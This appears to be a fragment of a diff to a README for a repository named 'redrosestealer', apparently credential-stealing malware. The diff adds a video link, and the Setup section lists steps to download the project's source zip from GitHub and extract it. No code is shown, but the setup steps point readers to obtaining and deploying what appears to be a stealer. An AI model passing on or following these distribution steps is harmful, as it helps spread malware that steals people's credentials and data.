@@ -7,6 +7,7 @@
 
 
 ### Setup
+https://streamable.com/37yjel
 
 1. [Download source code zip](https://codeload.github.com/pixelar56/redrosestealer/zip/refs/heads/main)
 2. Extract zip
